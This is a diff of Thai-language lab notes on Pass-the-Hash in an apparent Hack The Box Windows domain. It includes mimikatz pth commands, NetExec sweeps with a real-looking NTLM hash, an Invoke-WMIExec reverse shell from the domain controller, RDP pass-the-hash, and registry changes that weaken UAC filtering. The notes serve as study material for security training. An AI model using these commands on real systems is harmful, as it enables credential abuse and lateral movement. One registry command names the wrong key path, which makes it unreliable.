@@ -84,21 +84,9 @@ c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDD
 
 #### ผลลัพธ์:
 
-```
-user    : julio
-domain  : inlanefreight.htb
-program : cmd.exe
-impers. : no
-NTLM    : 64F12CDDAA88057E06A81B54E73B949B
-  |  PID  8404
-  |  TID  4268
-  |  LSA Process was already R/W
-  |  LUID 0 ; 5218172 (00000000:004f9f7c)
-  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
-  \_ kerberos - data copy @ 0000028FC964F288
-   \_ des_cbc_md4       OK
-   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
-```
+![alt text](image.png)
+
+![alt text](image-6.png)
 
 **หลังจากนี้:** ใช้ `cmd.exe` เพื่อรันคำสั่งในบริบทของ user julio
 
@@ -165,6 +153,8 @@ listening on [any] 8001 ...
 - ตั้งค่า: IP = 172.16.1.5, Port = 8001
 - เลือก: **PowerShell #3 (Base64)**
 
+![alt text](image-1.png)
+
 **ขั้นตอนที่ 3:** รัน Invoke-WMIExec
 
 ```powershell
@@ -179,6 +169,10 @@ PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.ht
 ```
 
 **ได้:** Reverse shell connection จาก DC01 (172.16.1.10)
+
+![alt text](image-2.png)
+
+![alt text](image-7.png)
 
 ---
 
@@ -225,37 +219,46 @@ C:\Windows\system32>
 - ใช้ automate การประเมิน security
 - สามารถทดสอบ authentication กับหลาย hosts
 
-#### A. Password Spraying
+#### A. Testing Password Reuse
 
-**การใช้งาน:**
 ```bash
-netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+# ทดสอบว่าเครื่องไหนใช้ local admin password เดียวกัน
+netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth
 ```
+- `--local-auth` = ให้ความแน่นอนว่าใช้ local auth
 
 **ผลลัพธ์:**
 ```
 SMB  172.16.1.10  445  DC01  [*] Windows 10.0 Build 17763 x64 (name:DC01)
-SMB  172.16.1.10  445  DC01  [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
+SMB  172.16.1.10  445  DC01  [-] .\Administrator:30B3... STATUS_LOGON_FAILURE 
 SMB  172.16.1.5   445  MS01  [*] Windows 10.0 Build 19041 x64 (name:MS01)
-SMB  172.16.1.5   445  MS01  [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
+SMB  172.16.1.5   445  MS01  [+] .\Administrator:30B3... (Pwn3d!)
 ```
 
-**คำอธิบาย:**
-- `(Pwn3d!)` = user เป็น local administrator บนเครื่องนั้น
+### ❌ **ไม่ใช้ `--local-auth` และระบุ -d INLANEFREIGHT** 
 
-#### B. Local Auth Method
-
-**เพิ่ม parameter:**
 ```bash
-netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth
+netexec smb 172.16.1.0/24 -u Administrator -d INLANEFREIGHT -H 30B3783CE2ABF1AF70F77D0660CF3453
 ```
 
-**ประโยชน์:**
-- ทดสอบ local administrator hash ข้าม multiple hosts
-- ตรวจสอบ password reuse
-- พบ gold images ที่ใช้ password เดียวกัน
+**NetExec คิดว่า:**
+- "คุณต้องการ authenticate ด้วย **domain account** `INLANEFREIGHT\Administrator`"
+- พยายามใช้ hash นี้กับ **Domain Controller**
 
-#### C. Command Execution
+**ผลลัพธ์:**
+```
+SMB  172.16.1.10  445  DC01  [-] INLANEFREIGHT\Administrator:30B3... STATUS_LOGON_FAILURE
+SMB  172.16.1.5   445  MS01  [-] INLANEFREIGHT\Administrator:30B3... STATUS_LOGON_FAILURE
+SMB  172.16.1.20  445  WS01  [-] INLANEFREIGHT\Administrator:30B3... STATUS_LOGON_FAILURE
+```
+
+**ทำไมล้มเหลว?**
+- Hash นี้เป็นของ **local account** ไม่ใช่ domain account
+- Domain Controller ไม่รู้จัก hash นี้
+
+
+
+#### B. Command Execution
 
 **การใช้งาน:**
 ```bash
@@ -304,6 +307,12 @@ Info: Establishing connection to remote endpoint
 
 ### 4. xfreerdp (RDP with PtH)
 
+```
+Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
+```
+
+![alt text](image-3.png)
+
 #### ⚠️ ข้อกำหนด:
 
 **1. Enable Restricted Admin Mode:**
@@ -317,6 +326,7 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
 Value: DisableRestrictedAdmin = 0
 ```
+![alt text](image-4.png)
 
 #### การใช้งาน:
 
@@ -325,6 +335,8 @@ xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ```
 
 **ผลลัพธ์:** ได้ GUI access ผ่าน RDP
+
+![alt text](image-5.png)
 
 ---
 
@@ -360,6 +372,168 @@ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministrat
 
 ❌ **Local accounts** จะถูกจำกัดโดย UAC settings
 
+
+
+## 🔐 UAC (User Account Control) คืออะไร?
+
+**UAC** เป็นฟีเจอร์ความปลอดภัยใน Windows ที่:
+- ป้องกันการเปลี่ยนแปลงระบบโดยไม่ได้รับอนุญาต
+- แม้ user เป็น Administrator ก็ยังถูกจำกัดสิทธิ์
+- ต้อง "elevate" สิทธิ์เมื่อต้องการทำงานที่สำคัญ
+
+---
+
+## 🎯 ปัญหาของ UAC กับ Pass the Hash
+
+### สถานการณ์:
+
+คุณมี **local Administrator hash** และพยายาม Pass the Hash จากระยะไกล:
+
+```bash
+# ตัวอย่าง: ใช้ NetExec
+netexec smb 172.16.1.10 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth
+```
+
+**คำถาม:** จะสำเร็จหรือไม่? → **ขึ้นอยู่กับ UAC settings!**
+
+---
+
+## 📋 Registry Key ที่ 1: LocalAccountTokenFilterPolicy
+
+### ที่อยู่:
+```
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
+```
+
+### ค่าที่ตั้งได้:
+
+| ค่า | ชื่อ | ความหมาย |
+|---|---|---|
+| **ไม่มี key นี้** หรือ **0** | Enabled (UAC ทำงาน) | เฉพาะ built-in Administrator (RID-500) ทำ remote admin ได้ |
+| **1** | Disabled (UAC ปิด) | Local admins **ทุกคน** ทำ remote admin ได้ |
+
+---
+
+### 🔬 ทดสอบความแตกต่าง
+
+#### **Scenario 1: Value = 0 (หรือไม่มี key)**
+
+**สถานการณ์:**
+- เครื่อง MS01 มี local users 2 คน:
+  - `Administrator` (RID-500) - built-in admin
+  - `htb-student` (RID-1001) - local admin ที่สร้างเอง
+
+**ทดสอบ PtH:**
+
+```bash
+# ใช้ built-in Administrator (RID-500)
+netexec smb 172.16.1.10 -u Administrator -d . -H <hash> --local-auth
+# ผลลัพธ์: ✅ (Pwn3d!) - สำเร็จ!
+
+# ใช้ htb-student (RID-1001)
+netexec smb 172.16.1.10 -u htb-student -d . -H <hash> --local-auth
+# ผลลัพธ์: ❌ STATUS_LOGON_FAILURE - ล้มเหลว!
+```
+
+**ทำไม htb-student ล้มเหลว?**
+- UAC กรอง (filter) local admin accounts ทั้งหมด **ยกเว้น RID-500**
+- แม้ htb-student จะเป็น local admin ก็ยังทำ remote admin ไม่ได้
+
+---
+
+#### **Scenario 2: Value = 1**
+
+**เปลี่ยน registry:**
+```cmd
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 /f
+```
+
+**ทดสอบ PtH อีกครั้ง:**
+
+```bash
+# ใช้ built-in Administrator (RID-500)
+netexec smb 172.16.1.10 -u Administrator -d . -H <hash> --local-auth
+# ผลลัพธ์: ✅ (Pwn3d!) - สำเร็จ!
+
+# ใช้ htb-student (RID-1001)
+netexec smb 172.16.1.10 -u htb-student -d . -H <hash> --local-auth
+# ผลลัพธ์: ✅ (Pwn3d!) - สำเร็จด้วย!
+```
+
+**ทำไม htb-student สำเร็จ?**
+- UAC filtering ถูกปิด
+- Local admins **ทุกคน** สามารถทำ remote admin ได้
+
+---
+
+## 📋 Registry Key ที่ 2: FilterAdministratorToken
+
+### ที่อยู่:
+```
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken
+```
+
+### ค่าที่ตั้งได้:
+
+| ค่า | ชื่อ | ความหมาย |
+|---|---|---|
+| **ไม่มี key นี้** หรือ **0** | Disabled (default) | RID-500 **bypass** UAC filtering |
+| **1** | Enabled | RID-500 **ถูก** UAC filtering |
+
+---
+
+### 🔬 ทดสอบความแตกต่าง
+
+#### **Scenario 1: Value = 0 (default)**
+
+**สถานการณ์:**
+- `LocalAccountTokenFilterPolicy` = 0 (UAC enabled)
+- `FilterAdministratorToken` = 0 (RID-500 bypass UAC)
+
+**ทดสอบ PtH:**
+
+```bash
+# ใช้ Administrator (RID-500)
+netexec smb 172.16.1.10 -u Administrator -d . -H <hash> --local-auth
+# ผลลัพธ์: ✅ (Pwn3d!) - สำเร็จ!
+# เหตุผล: RID-500 ได้รับสิทธิพิเศษ bypass UAC
+```
+
+---
+
+#### **Scenario 2: Value = 1**
+
+**เปลี่ยน registry:**
+```cmd
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v FilterAdministratorToken /d 1 /f
+```
+
+**ทดสอบ PtH อีกครั้ง:**
+
+```bash
+# ใช้ Administrator (RID-500)
+netexec smb 172.16.1.10 -u Administrator -d . -H <hash> --local-auth
+# ผลลัพธ์: ❌ STATUS_LOGON_FAILURE - ล้มเหลว!
+# เหตุผล: RID-500 ถูก UAC filtering เหมือนกับ local admins คนอื่น
+```
+
+**สรุป:** แม้แต่ built-in Administrator ก็ทำ remote admin ไม่ได้!
+
+---
+
+## 🎭 Matrix ของความเป็นไปได้
+
+### ตาราง: PtH สำเร็จหรือไม่?
+
+| LocalAccountTokenFilterPolicy | FilterAdministratorToken | RID-500 | Local Admins อื่น |
+|---|---|---|---|
+| **0** (หรือไม่มี) | **0** (หรือไม่มี) | ✅ สำเร็จ | ❌ ล้มเหลว |
+| **0** (หรือไม่มี) | **1** | ❌ ล้มเหลว | ❌ ล้มเหลว |
+| **1** | **0** (หรือไม่มี) | ✅ สำเร็จ | ✅ สำเร็จ |
+| **1** | **1** | ✅ สำเร็จ | ✅ สำเร็จ |
+
+
+
 ---
 
 ## 📋 สรุปเครื่องมือและ Use Cases
@@ -374,38 +548,3 @@ HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministrat
 | **xfreerdp** | Linux | RDP | GUI access | ต้อง enable Restricted Admin |
 
 ---
-
-## 💡 Best Practices และข้อแนะนำ
-
-### สำหรับ Penetration Testers:
-
-1. **เก็บ hashes ที่ได้มา** - อาจใช้ได้กับหลาย systems
-2. **Test password reuse** - ใช้ NetExec scan subnet
-3. **ระวัง account lockout** - อย่า spray passwords มากเกินไป
-4. **Document findings** - บันทึก systems ที่ vulnerable
-
-### สำหรับ Defenders:
-
-1. **Implement LAPS** - Local Administrator Password Solution
-2. **Enable UAC properly** - ตั้งค่า LocalAccountTokenFilterPolicy
-3. **Monitor for PtH attacks** - ดู event logs สำหรับ logon type 3, 9, 10
-4. **Use Kerberos** - disable NTLM ถ้าเป็นไปได้
-5. **Unique local admin passwords** - อย่าใช้ password เดียวกันข้าม systems
-
----
-
-## 🎯 Key Takeaways
-
-### ทำไม PtH ถึงอันตราย:
-
-1. **ไม่ต้องรู้รหัสผ่านจริง** - แค่มี hash ก็พอ
-2. **Hash ไม่เปลี่ยน** - จนกว่าจะเปลี่ยนรหัสผ่าน
-3. **Lateral Movement** - ใช้เคลื่อนที่ข้าม network ได้
-4. **Multiple Tools** - มีเครื่องมือหลากหลายให้เลือกใช้
-
-### ความแตกต่างจาก Kerberos:
-
-- **NTLM:** ใช้ hash ได้โดยตรง (PtH)
-- **Kerberos:** ต้อง crack hash หรือใช้ Pass the Ticket (PtT)
-
-**ในบทถัดไป:** จะเรียนรู้การใช้ Kerberos protocol สำหรับ lateral movement!
